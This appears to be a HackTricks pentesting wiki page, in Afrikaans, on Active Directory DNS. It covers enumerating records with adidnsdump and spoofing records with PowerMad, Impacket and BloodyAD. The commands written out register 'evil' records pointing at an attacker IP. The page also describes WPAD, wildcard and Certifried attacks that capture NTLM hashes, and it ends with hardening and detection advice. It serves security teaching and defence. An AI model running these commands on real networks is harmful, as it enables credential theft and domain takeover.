# AD DNS Rekords

{{#include ../../banners/hacktricks-training.md}}

Standaard kan **enige gebruiker** in Active Directory **alle DNS rekords** in die Domein of Woud DNS sones **opnoem**, soortgelyk aan 'n sonetransfer (gebruikers kan die kindobjekte van 'n DNS son in 'n AD omgewing lys).

Die hulpmiddel [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) stel **opname** en **uitvoer** van **alle DNS rekords** in die sone vir rekonsiliasiedoele van interne netwerke in staat.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) voeg JSON/Greppable (`--json`) uitvoer, multi-threaded DNS-resolusie en ondersteuning vir TLS 1.2/1.3 by wanneer dit aan LDAPS bind

Vir meer inligting lees [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Skep / Wysig rekords (ADIDNS spoofing)

Omdat die **Geoutentiseerde Gebruikers** groep standaard **Skep Kind** op die sone DACL het, kan enige domeinrekening (of rekenaarrekening) addisionele rekords registreer. Dit kan gebruik word vir verkeerskapings, NTLM relay dwang of selfs volle domeinkompromie. 

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py word saam met Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Algemene aanval primitiewe

1. **Wildcard rekord** – `*.<zone>` verander die AD DNS bediener in 'n onderneming-wye responder soortgelyk aan LLMNR/NBNS spoofing. Dit kan misbruik word om NTLM hashes te vang of om dit na LDAP/SMB te relaye.  (Vereis dat WINS-lookup gedeaktiveer moet wees.)
2. **WPAD hijack** – voeg `wpad` (of 'n **NS** rekord wat na 'n aanvaller gasheer wys om die Global-Query-Block-List te omseil) by en proxy deursigtig uitgaande HTTP versoeke om akrediteer te versamel.  Microsoft het die wildcard/ DNAME omseilings reggestel (CVE-2018-8320) maar **NS-rekords werk steeds**.
3. **Stale entry takeover** – eis die IP adres wat voorheen aan 'n werkstasie behoort het en die geassosieerde DNS inskrywing sal steeds oplos, wat hulpbron-gebaseerde beperkte delegasie of Shadow-Credentials aanvalle moontlik maak sonder om DNS te raak.
4. **DHCP → DNS spoofing** – op 'n standaard Windows DHCP+DNS implementering kan 'n nie-geoutentiseerde aanvaller op dieselfde subnet enige bestaande A rekord (insluitend Domein Beheerders) oorskryf deur vervalste DHCP versoeke te stuur wat dinamiese DNS opdaterings aktiveer (Akamai “DDSpoof”, 2023).  Dit gee masjien-in-die-middel oor Kerberos/LDAP en kan lei tot volle domein oorneem.
5. **Certifried (CVE-2022-26923)** – verander die `dNSHostName` van 'n masjienrekening wat jy beheer, registreer 'n ooreenstemmende A rekord, en versoek dan 'n sertifikaat vir daardie naam om die DC na te doen. Gereedskap soos **Certipy** of **BloodyAD** outomatiseer die vloei volledig.

---

## Opsporing & versterking

* Weier **Geoutentiseerde Gebruikers** die *Skep alle kind objekte* reg op sensitiewe sones en deleger dinamiese opdaterings aan 'n toegewyde rekening wat deur DHCP gebruik word.
* As dinamiese opdaterings vereis word, stel die sone in op **Seker-net** en aktiveer **Naam Beskerming** in DHCP sodat slegs die eienaar rekenaar objek sy eie rekord kan oorskryf.
* Monitor DNS Bediener gebeurtenis ID's 257/252 (dinamiese opdatering), 770 (sone oordrag) en LDAP skrywe na `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokkeer gevaarlike name (`wpad`, `isatap`, `*`) met 'n doelbewus-goedaardige rekord of via die Global Query Block List.
* Hou DNS bedieners op datum – byvoorbeeld, RCE foute CVE-2024-26224 en CVE-2024-26231 het **CVSS 9.8** bereik en is op afstand uitbuitbaar teen Domein Beheerders.

## Verwysings

* Kevin Robertson – “ADIDNS Herbesoek – WPAD, GQBL en Meer”  (2018, steeds die de-facto verwysing vir wildcard/WPAD aanvalle)
* Akamai – “Spoofing DNS Rekords deur DHCP DNS Dinamiese Opdaterings te Misbruik” (Des 2023)
{{#include ../../banners/hacktricks-training.md}}
